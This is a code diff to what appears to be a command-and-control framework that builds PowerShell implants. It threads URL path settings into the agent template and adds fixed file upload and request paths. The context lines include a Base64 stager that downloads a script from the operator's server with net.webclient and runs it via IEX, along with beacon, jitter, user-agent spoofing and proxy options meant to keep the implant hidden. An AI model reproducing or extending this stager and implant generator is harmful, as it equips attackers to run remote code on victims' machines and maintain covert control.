@@ -184,9 +184,10 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         proxy_enabled=proxy_enabled_ps,
         proxy_type=agent_config.get("proxy_type", "system"),
         proxy_server=agent_config.get("proxy_server", ""),
-        proxy_port=agent_config.get("proxy_port", "")
+        proxy_port=agent_config.get("proxy_port", ""),
+        url_paths=url_paths
     )
-    
+        
     # Create the Base64 stager with improved security for first contact
     stager_path = url_paths["stager_path"]
     base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{server_address}{stager_path}');IEX($S)"
@@ -260,7 +261,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            beacon_interval, jitter_percentage, max_failures, max_backoff,
                            random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            username="", password="", proxy_enabled="$false", proxy_type="system",
-                           proxy_server="", proxy_port=""):
+                           proxy_server="", proxy_port="", url_paths=None):
     """Generate the PowerShell agent code from templates with all options"""
     
     # Get template paths
@@ -300,6 +301,10 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
         path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
         path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", beacon_path)
         path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
+        
+        # Use fixed fallback paths since we don't have url_paths in this context
+        path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", "/file_upload")
+        path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", "/file_request")
     
     # Fill in the agent template with all values
     agent_code = agent_template
